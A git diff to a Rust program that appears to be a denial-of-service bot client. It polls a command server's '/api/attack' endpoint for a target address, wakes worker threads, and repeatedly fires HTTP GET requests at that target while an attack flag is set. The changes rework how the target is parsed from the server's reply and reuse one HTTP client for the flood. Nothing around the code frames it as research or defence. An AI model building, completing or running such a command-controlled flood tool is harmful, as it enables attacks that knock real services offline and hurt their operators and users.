@@ -1,5 +1,6 @@
 use serde_json;
 use std::sync::{Arc, Mutex, Condvar};
+use serde_json::Value;
 
 struct Client {
     host_address: String,
@@ -21,7 +22,7 @@ impl Worker {
         let client = reqwest::blocking::Client::new();
         let mut add = host.clone();
         add.push_str("/attack_info");
-        Worker {host_address: add, attacking: true, address: addr, client }
+        Worker {host_address: add, attacking: false, address: addr, client }
     }
     fn start_requesting(&self) -> i32{
         if self.attacking {
@@ -39,8 +40,8 @@ impl Worker {
 }
 
 impl Client {
-    fn new(host: String, addr: String) -> Client {
-        let mut cl = Client { host_address: host, address: addr, attacking: true, workers: vec![], worker_threads: vec![] };
+    fn new(host: String) -> Client {
+        let mut cl = Client { host_address: host, address:String::new(), attacking: true, workers: vec![], worker_threads: vec![] };
         // let thread_count = std::thread::available_parallelism().unwrap().get();
         let thread_count = 4;
         cl.worker_threads.reserve(thread_count);
@@ -51,27 +52,20 @@ impl Client {
             )));
 
         }
-        cl.host_address.push_str("/api/attack");
         return cl;
     }
 
     fn can_attack(&mut self) {
         let url = self.host_address.as_str();
-        let req = reqwest::blocking::get(url).unwrap().text().unwrap();
-
-        let attack_address_url = format!("{}/api/attack_address", self.host_address);
-        let attack_address_resp = reqwest::blocking::get(&attack_address_url);
-        let mut can_attack = false;
-        if let Ok(resp) = attack_address_resp {
-            if resp.status() == reqwest::StatusCode::OK {
-                let body = resp.text().unwrap();
-                if !body.is_empty() {
-                    println!("Attack address found: {}", body);
-                    can_attack = true;
-                }
-            }
+        let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
+            strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
+        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
+        println!("{}", attack_address_url);
+        let mut can_attack = true;
+        if attack_address_url.is_empty() {
+            can_attack = false;
         }
-
+        self.address = attack_address_url.to_string();
         if can_attack {
             println!("can attack");
             self.attacking = true;
@@ -80,6 +74,7 @@ impl Client {
                 let clone_el = el.clone();
                 let (elem, cv) = &*clone_el;
                 let mut worker = elem.lock().unwrap();
+                worker.address = self.address.clone();
                 worker.attacking = true;
                 cv.notify_one();
             }
@@ -91,6 +86,7 @@ impl Client {
                 println!("main thread command: is to stop");
                 let (elem, cv) = &*clone_el;
                 let mut worker = elem.lock().unwrap();
+                worker.address = self.address.clone();
                 worker.attacking = false;
             }
         }
@@ -115,6 +111,7 @@ impl Client {
     }
 
     fn run(mut self) {
+        let cl =  reqwest::blocking::Client::new();
         let max_size = self.workers.capacity();
         let mut i = 0;
         while i < max_size {
@@ -133,7 +130,7 @@ impl Client {
             let mut j = 0;
             while j < 5 {
                 if self.attacking {
-                    let _ = reqwest::blocking::get(self.address.to_owned().as_str());
+                    let _ = cl.get(self.address.to_owned().as_str()).send();
                 }
                 j += 1;
             }
@@ -148,7 +145,7 @@ impl Client {
 
 
 fn main() {
-    let cl = Client::new(String::from("http://localhost:8080"),
-                         String::from("http://localhost:8000"));
+    let mut cl = Client::new(String::from("http://localhost:8080"));
     cl.run();
+    // cl.can_attack();
 }
